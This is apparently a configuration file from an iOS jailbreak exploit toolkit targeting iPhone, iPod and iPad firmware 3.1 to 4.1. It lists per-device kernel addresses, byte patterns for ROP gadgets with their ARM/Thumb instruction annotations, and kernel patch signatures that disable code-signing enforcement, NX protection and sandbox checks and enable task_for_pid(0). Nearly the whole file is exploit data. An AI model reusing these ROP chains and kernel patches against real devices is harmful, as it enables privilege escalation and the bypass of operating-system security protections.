'all': {
    'iPhone3,1_4.0.1_8A306': { '<': 'iPhone3,1_4.0_8A293', },
    'iPhone1,2_4.0_8A293': {
        '<': '.armv6_4.x',
        '#kern': {
            'vram_baseaddr': 0xca67d000,     
        },
    },
    'iPhone1,2_4.0.1_8A306': {
        '<': '.armv6_4.x',
        '#kern': {
            'vram_baseaddr': 0xca67d000, 
        },
    },
    'iPhone2,1_4.0_8A293': {
        '<': '.armv7',
        '#kern': {
            'vram_baseaddr': 0xcd32d000, 
        },
    },
    'iPhone2,1_4.0.1_8A306': {
        '<': '.armv7',
        '#kern': {
            'vram_baseaddr': 0xcd32d000,    
        },
    },
    'iPod2,1_4.0_8A293': {
        '<': '.armv6_4.x',
        '#kern': {
            'vram_baseaddr': 0xca68d000, 
        },
    },
    'iPhone2,1_3.1.3_7E18': {
        '<': '.armv7_3.1.x',
        '#kern': {
            'vram_baseaddr': 0xed731000,       
        },
    },
    'iPhone2,1_3.1.2_7D11': {
        '<': '.armv7_3.1.x',
        '#kern': {
            'vram_baseaddr': 0xed731000,       
        },
    },
    'iPod2,1_3.1.2_7D11': {
        '<': '.armv6_3.1.x',
        '#kern': {
            'vram_baseaddr': 0xeb849000,
        },
    },
    'iPod2,1_3.1.3_7E18': {
        '<': '.armv6_3.1.x',
        '#kern': {
            'vram_baseaddr': 0xed731000,
        },
    },
    'iPhone1,x_3.1.3_7E18': {
        '<': '.armv6_3.1.x',
        '#kern': {
            'vram_baseaddr': [0xeb811000, 0xeb809000],
        },
    },
    'iPhone1,x_3.1.2_7D11': {
        '<': 'iPhone1,x_3.1.3_7E18',
        '#kern': {
            'vram_baseaddr': [0xeb811000, 0xeb809000],
        },
    },
    'iPod3,1_3.1.3_7E18': {
        '<': '.armv7_3.1.x',
        '#kern': {
            'vram_baseaddr': 0xed615000, 
        },
    },
    'iPod3,1_3.1.2_7D11': {
        '<': '.armv7_3.1.x',
        '#kern': {
            'vram_baseaddr': 0xed615000,       
        },
    },
    'iPod1,1_3.1.2_7D11': {
        '<': '.armv6_3.1.x',
        '#kern': {
            'vram_baseaddr': 0xeb919000,   
        },
    },
    'iPod1,1_3.1.3_7E18': {
        '<': '.armv6_3.1.x',
        '#kern': {
            'vram_baseaddr': 0xeb919000,   
        },
    },
    'iPod3,1_4.0_8A293': {
        '<': '.armv7',
        '#kern': {
            'vram_baseaddr': 0xcd33d000, 
        },
    },
    'iPad1,1_3.2_7B367': {
        '<': '.armv7',
        '#kern': {
            'vram_baseaddr': [0xed6ed000, 0xed6f5000],
        },
        'kill_sb': 1,
    },
    'iPad1,1_3.2.1_7B405': {
        '<': 'iPad1,1_3.2_7B367',
    },
    'iPad1,1_3.2.2_7B500': {
        '<': '.armv7',
        '#kern': {
        },
    },

    'iPhone3,1_4.0_8A293': {
        '<': '.armv7',
        '#kern': {
            'vram_baseaddr': 0xd2675000,
            # ???
            'patch3':       '70 46 13 22 .. 4b 98 47 00 .. -',
            'root_ios_id': 2,
        },
    },
    'iPod2,1_4.1_8B117': {
        '<': '.armv6_4.x',
        '#kern': {
        
        },
    },
    'iPhone2,1_4.1_8B117': {
        '<': '.armv7',
        '#kern': {
        
        },
    },
    'iPhone1,2_4.1_8B117': {
        '<': '.armv6',
        '#kern': {
        
        },
    },
    'iPod3,1_4.1_8B117': {
        '<': '.armv7',
        '#kern': {
        
        },
    },
    'iPhone3,1_4.1_8B117': {
        '<': '.armv7',
        '#kern': {
        
        },
    },
    'iPod4,1_4.1_8B117': {
        '<': '.armv7',
        '#kern': {
        
        },
    },
    'iPod4,1_4.1_8B118': {
        '<': '.armv7',
        '#kern': {
        
        },
    },
},
'world1': {
    'insane': {
        'arch': 'armv6',
        'is_armv7': 0xfeee0000,
        '#kern': {
            '@binary': None,
            'sb_evaluate_orig1': 0xfeed0001,
            'sb_evaluate_orig2': 0xfeed0002,
            'sb_evaluate_jumpto': 0xfeed0003,
            'memcmp': 0xfeed0004,
            'vn_getpath': 0xfeed0005,
            'dvp_struct_offset': 0xfeed0006,
            
            # feddit
            'patch_cs_enforcement_disable': 0xfedd0001,
            'patch_cs_enforcement_disable_to': 1,
            'patch_kernel_pmap_nx_enabled': 0xfedd0002,
            'patch_kernel_pmap_nx_enabled_to': 0,
            'sysent_patch': 0xfedd0004,
            'sysent_patch_orig': 0xfedd0005,
            'target_addr': 0xfedd0006,
            'patch1': 0xfedd0007,
            'patch1_to':    0xfedd0016,
            'patch3': 0xfedd0008,
            'patch3_to':    0xfedd0017,
            'patch4': 0xfedd0018,
            'patch4_to':    0x47702001,
            #'kernel_map': 0xfedd0017,
            #'lck_rw_lock_exclusive': 0xfedd0018,
            #'lck_rw_done': 0xfedd0019,
            'patch_tfp0': 0xfedd0009,
            'patch_tfp0_to': 0x46c0e00b,
            'flush_dcache': 0xfedd0010,
            'invalidate_icache': 0xfedd0011,
            'copyin': 0xfedd0012,
            'IOLog': 0xfedd0013,
            'kalloc': 0xfedd0014,
            'sb_evaluate': 0xfedd0015,
        },
        '#cache': {
            '@binary': None,
            'k2': 0xfeed0002,
            'k3': 0xfeed0003,
            'k4': 0xfeed0004,
            'k5': 0xfeed0005,
            'k6': 0xfeed0006,
            'k7': 0xfeed0007,
            'k9': 0xfeed0009,
            'k10': 0xfeed0010,
            'k11': 0xfeed0011,
            'k12': 0xfeed0012,
            'k14': 0xfeed0014,
            'k15': 0xfeed0015,
            'k16': 0xfeed0016,
            'k17': 0xfeed0017,
            'k18': 0xfeed0018,
            'k19': 0xfeed0019,
            'kinit': 0xdeadfeed,
            'sysctlbyname': 0xfeed1001,
            'execve': 0xfeed1002,
        },
    },

    '.base': {
        '#kern': {
            'patch4':       '-_PE_i_can_has_debugger',
            'patch4_to':    0x47702001,

            'patch_cs_enforcement_disable': lambda: resolve_ldr(k('cs_enforcement_disable_check')),
            'patch_cs_enforcement_disable_to': 1,

            # for pmap.c
            #'kernel_pmap':  '-_kernel_pmap',
            #'mem_size':     '-_mem_size',

            'patch_kernel_pmap_nx_enabled': lambda: deref(sym('-_kernel_pmap'))+0x420,
            'patch_kernel_pmap_nx_enabled_to': 0,

            'sysent': '21 00 00 00 00 10 86 00 /',
            'sysent_patch': lambda: k('sysent') + 4,
            'sysent_patch_orig': lambda: deref(k('sysent_patch')),
            'target_addr': lambda: (k('sysent_patch_orig') & 0x00ffffff) | 0x2f000000,

            # for sandbox
            'memcmp': '+_memcmp',
            'IOLog': '+_IOLog',
            'kalloc': '+_kalloc',
            'vn_getpath': '+_vn_getpath',
            'sb_evaluate_orig1': lambda: deref(k('sb_evaluate')),
            'sb_evaluate_orig2': lambda: deref(k('sb_evaluate')+4),

            'flush_dcache': '+_flush_dcache',
            'invalidate_icache': '+_invalidate_icache',
            'copyin': '+_copyin',

            #'scratch': lambda: scratch(),
        },

        '#cache': {
            'sysctlbyname': '+_sysctlbyname',
            'execve': '+_execve',
        },

        'kill_sb': 0,
    },

    '.armv7': {
        '<':            '.base',
        'arch':         'armv7',
        
        'is_armv7': 1,
        
        '#cache': {
            # ldr r0, [r0]; pop {r4, r5, r7, pc}
            'k4': '@ + 00 68 b0 bd',
            # str r0, [r4]; pop {r4, r7, pc}
            'k5': '@ + 20 60 90 bd',
            # add r0, r4; pop {r4, r7, pc}
            'k6': '@ + 20 44 90 bd',
            # pop {r0-r3, pc}
            'k7': '@ + 0f bd',
            # pop {r0-r3, pc} (ARM!)
            #'k7': '@ - 0f 80 bd e8',
            # pop {r1, r2, r3, pc}
            'k9': '@ + 0e bd',
            # sub sp, r7, #0; pop {r7, pc}
            'k10': '@ + a7 f1 00 0d 80 bd',
            # pop {r4-r7, pc}
            'k11': '@ + f0 bd',
            # pop {r4, pc}
            'k18': '@ + 10 bd',
            # blx r4; pop {r4, r5, r7, pc}
            'k12': '@ + a0 47 b0 bd',

            # ldr r0, [r4, r0]; pop {r4, r7, pc}
            'k14': '@ + 20 58 90 bd',

            # str r4, [r0]; pop {r4, r7, pc}
            'k15': '@ + 40 f8 04 4b 90 bd',

            # ldr r0, [r4]; pop {r4, r7, pc}
            'k16': '@ + 20 68 90 bd',
            
            # str r5, [r4]; pop {r4, r5, r7, pc} 
            'k17': '@ + 25 60 b0 bd',
            
            # pop {r7, pc}
            'k19': '@ + 80 bd',

            # OLD: ldmibmi r11, {sp, pc}
            #      actually the tail half of a ldr.w r12, [r1, r0] + ldr r1, [pc, #620] 
            # new (to comply with armv6): ldmibmi r11!, {r3, r7, r12, sp, pc}
            'kinit': '@ - % 88 b0 bb 49',

            # branch support
            # and.w r0, #1; pop {r7, pc}
            #'k3': '@ + 00 f0 01 00 80 bd',
            # ldr.w r0, [r4, r0, lsl #2]; pop {r4, r5, r7, pc}
            #'k2': '@ + 54 f8 20 00',
        },

        '#kern': {
            # vm_map and AMFI
            # these are overridden by the one down there
            'patch1':       '- 02 0f .. .. 63 08 03 f0 01 05 e3 0a 13 f0 01 03 1e 93',
            'patch1_to':    0x46c00f02,
            'patch3':       '~ 23 78 9c 45 05 d1 .. .. .. .. .. .. .. 4b 98 47 00 .. -',
            'patch3_to':    0x1c201c20,

            # the actual check for 0
            'patch_tfp0': '85 68 00 23 .. 93 .. 93 - 5c b9',
            'patch_tfp0_to': 0x46c0e00b,
            
            'cs_enforcement_disable_check': '1d ee 90 3f d3 f8 4c 33 d3 f8 9c 20 + .. .. .. .. 19 68 00 29',
            'derive_vnode_path': lambda: bof(stringref('path')),
            'dvp_load_vn': '=derive_vnode_path - .. 68/69 6a 46',
            'dvp_struct_offset': lambda: {0x466a6920: 0x10, 0x466a6960: 0x14}[deref(k('dvp_load_vn'))],
            
            'sb_evaluate': lambda: bof(stringref('bad opcode')),
            'sb_evaluate_jumpto': lambda: k('sb_evaluate')+9,
        },
    },

    '.armv7_3.1.x': {
        '<': '.armv7',
        '#kern': {
            'patch1':       '- 02 0f 40 f0 .. .. 63 08 03 f0 01 05 e3 0a 13 f0 01 03 1e 93',
            'patch1_to':    0xf0400f00,
            'patch3':       '61 1c 70 46 13 22 05 4b 98 47 - 00 ..',
            'patch3_to':    0x46c046c0,
        },
    },

    '.armv6': {
        '<':            '.base',
        'arch':         'armv6',

        'is_armv7': 0,
        
        '#cache': {
            # ldr r0, [r0]; pop {r4, r5, r7, pc}
            'k4': '@ - 00 00 90 e5 b0 80 bd e8',
            # str r0, [r4]; pop {r4, r7, pc}
            'k5': '@ - 00 00 84 e5 90 80 bd e8',
            # add r0, r4; pop {r4, r7, pc}
            'k6': '@ - 00 00 84 e0 90 80 bd e8',
            # pop {r0-r3, pc} (ARM!)
            'k7': '@ - 0f 80 bd e8',
            # pop {r1, r2, r3, pc}
            'k9': '@ + 0e bd',
            # sub sp, r7, #0; pop {r7, pc}
            'k10': '@ - 00 d0 47 e2 80 80 bd e8',
            # pop {r4-r7, pc}
            'k11': '@ + f0 bd',
            # pop {r4, pc}
            'k18': '@ + 10 bd',
            # blx r4; pop {r4, r5, r7, pc}
            'k12': '@ - 34 ff 2f e1 b0 80 bd e8',
            
            # add r0, sp, #600; pop {r1, r7, pc}
            'k13': '@ + 96 a8 82 bd',
            # ldr r0, [r4, r0]; pop {r4, r7, pc}
            'k14': '@ + 20 58 90 bd',

            # str r4, [r0]; pop {r4, r7, pc}
            'k15': '@ - 00 40 80 e5 90 80 bd e8',

            # ldr r0, [r4]; pop {r4, r7, pc}
            'k16': '@ - 00 00 94 e5 90 80 bd e8',

            # str r5, [r4]; pop {r4, r5, r7, pc}
            'k17': '@ - 00 50 84 e5 b0 80 bd e8',

            # a little messier
            # I could also use r10, but that's ugly (it points to the section entry)
            # ldmibpl	r11, {r6, r9, ip, sp, pc}^
            'kinit': '@ - % 40 b2 db 59',

            # branch support
            # and r0, #1; pop {r7, pc}
            'k3': '@ - 01 00 00 e2 80 80 bd e8',
            # ldr r0, [r4, r0, lsl #2]; pop {r4, r5, r7, pc}
            'k2': '@ - 04 01 90 e7 b0 80 bd e8',
                
        },

        '#kern': {
            'patch1':       '- .. .. .. .. 6b 08 1e 1c eb 0a 01 22 1c 1c 16 40 14 40',
            'patch1_to':    0x46c046c0,
            'patch3':       '13 20 a0 e3 .. .. .. .. 33 ff 2f e1 00 00 50 e3 00 00 00 0a .. 40 a0 e3 - 04 00 a0 e1 90 80 bd e8',
            'patch3_to':    0xe3a00001,
            
            'patch_tfp0': '85 68 .. 93 .. 93 - 00 2c 0b d1',
            'patch_tfp0_to': 0x46c0e00b,

            'cs_enforcement_disable_check': '9c 22 03 59 99 58 + .. .. 1a 68 00 2a',
            'derive_vnode_path': lambda: bof(stringref('path'), False),
            'dvp_load_vn': '=derive_vnode_path 00 00 50 e3 02 30 a0 11 - .. 00 94 e5',
            'dvp_struct_offset': lambda: deref(k('dvp_load_vn')) & 0xff,
            
            'sb_evaluate': lambda: bof(stringref('bad opcode'), False),
            'sb_evaluate_jumpto': lambda: k('sb_evaluate')+8,
        },
    },

    '.armv6_4.x': {
        '<': '.armv6',
    },
    '.armv6_3.1.x': {
        '<': '.armv6',
    },

},
'world2': {
    '.armv7': {
        '#dyld': {
           # str r0, [r4]; pop {r4, r7, pc}
           'k5': '@ + 20 60 90 bd',
           # skip k10 k18 k12 k13 k14 
           # pop {r4-r7, pc}
           'k11': '@ + f0 bd',
           # str r4, [r0]; pop {r4, r7, pc}
           'k15': '@ + 04 60 90 bd',
           # pop {r7, pc}
           'k18': '@ + 80 bd',
           # mov r12, r0; pop {r0-r3, r7, lr}; add sp, #8; bx r12
           'k20': '@ - 00 c0 a0 e1 8f 40 bd e8 08 d0 8d e2 1c ff 2f e1',
           # mov r0, r4; pop {r4, r7, pc}
           'k21': '@ + 20 46 90 bd',
           # blx r4; pop {r4, r7, pc}
           'k22': '@ + a0 47 90 bd',
           # ldr r0, [r4, #8]; pop {r4, r5, r7, pc}
           'k23': '@ + a0 68 b0 bd',
           # ldr r0, [r0]; pop {r7, pc}
           'k24': '@ + 00 68 80 bd',
        }
    },
    '.armv7': {
        '<': '.armv7',
    },
},
'world3': {
    '.armv7': { '#cache': {} },
},
